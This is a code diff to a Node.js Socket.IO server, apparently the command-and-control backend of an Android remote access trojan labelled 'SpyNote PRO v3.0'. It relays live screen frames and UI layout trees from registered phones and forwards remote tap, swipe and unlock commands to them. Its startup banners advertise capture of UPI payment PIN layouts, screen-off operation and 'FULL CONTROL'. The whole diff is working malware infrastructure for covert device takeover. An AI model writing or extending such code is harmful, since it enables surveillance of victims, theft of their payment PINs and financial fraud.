@@ -10,7 +10,7 @@ const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingTimeout: 60000,
     pingInterval: 25000,
-    maxHttpBufferSize: 100e6 // 100MB for HD + Layout
+    maxHttpBufferSize: 100e6
 });
 
 app.use(compression());
@@ -37,20 +37,11 @@ io.on('connection', (socket) => {
                 lastSeen: Date.now()
             });
             socket.join(`device_${deviceId}`);
-            console.log('📱 Device registered:', deviceId, deviceInfo.model, 
-                       deviceInfo.screenLocked ? '🔒 LOCKED' : '✅ UNLOCKED');
+            console.log('📱 FULL CONTROL device:', deviceId, deviceInfo.model);
             io.emit('devices-update', Array.from(devices.entries()));
         }
     });
 
-    socket.on('device-ready', (deviceId) => {
-        if (devices.has(deviceId)) {
-            const device = devices.get(deviceId);
-            devices.set(deviceId, { ...device, status: 'streaming' });
-        }
-    });
-
-    // 🔥 ULTRA LOW LATENCY FRAME + LAYOUT RELAY
     socket.on('screen-frame', (frameData) => {
         const deviceId = frameData.deviceId;
         if (devices.has(deviceId)) {
@@ -59,35 +50,18 @@ io.on('connection', (socket) => {
         }
     });
 
-    socket.on('layout-hierarchy', (layoutData) => {
+    socket.on('layout-tree', (layoutData) => {
         const deviceId = layoutData.deviceId;
         if (devices.has(deviceId)) {
-            socket.to(`device_${deviceId}`).emit('layout-hierarchy', layoutData);
+            socket.to(`device_${deviceId}`).emit('layout-tree', layoutData);
         }
     });
 
-    // 🔥 INSTANT CONTROL RELAY
     socket.on('control', (controlData) => {
-        const { deviceId, action, x, y, startX, startY, endX, endY } = controlData;
+        const { deviceId, action, ...data } = controlData;
         if (devices.has(deviceId)) {
-            socket.to(`device_${deviceId}`).emit('control', {
-                action,
-                x: parseFloat(x) || 0,
-                y: parseFloat(y) || 0,
-                startX: parseFloat(startX) || 0,
-                startY: parseFloat(startY) || 0,
-                endX: parseFloat(endX) || 0,
-                endY: parseFloat(endY) || 0
-            });
-            console.log(`🎮 ${action.toUpperCase()} → ${deviceId.slice(0,8)} (${Math.round(x || 0)},${Math.round(y || 0)})`);
-        }
-    });
-
-    socket.on('unlock-device', (data) => {
-        const { deviceId } = data;
-        if (devices.has(deviceId)) {
-            socket.to(`device_${deviceId}`).emit('unlock-device');
-            console.log(`🔓 UNLOCK → ${deviceId.slice(0,8)}`);
+            socket.to(`device_${deviceId}`).emit('control', { action, ...data });
+            console.log(`🎮 ${action.toUpperCase()} → ${deviceId.slice(0,8)}`);
         }
     });
 
@@ -96,18 +70,17 @@ io.on('connection', (socket) => {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.emit('devices-update', Array.from(devices.entries()));
-                console.log('📱 Device offline:', deviceId);
                 break;
             }
         }
     });
 });
 
-// Keep-alive + Screen Lock Detection
+// Keepalive
 setInterval(() => {
     const now = Date.now();
     for (const [deviceId, info] of devices.entries()) {
-        if (info.connected && (now - info.lastSeen > 45000)) {
+        if (info.connected && (now - info.lastSeen > 60000)) {
             devices.set(deviceId, { ...info, connected: false });
             io.emit('devices-update', Array.from(devices.entries()));
         }
@@ -116,7 +89,7 @@ setInterval(() => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 SpyNote PRO v3.0 - LAYOUT + SCREEN OFF`);
-    console.log(`🌐 Web: http://localhost:${PORT}`);
-    console.log(`✅ UPI PIN LAYOUT • SMOOTH 30FPS • ANDROID 14+ READY`);
+    console.log(`🚀 SpyNote PRO v3.0 on port ${PORT}`);
+    console.log(`🌐 http://localhost:${PORT}`);
+    console.log(`✅ LAYOUT + UNLOCK + SCREEN OFF READY`);
 });
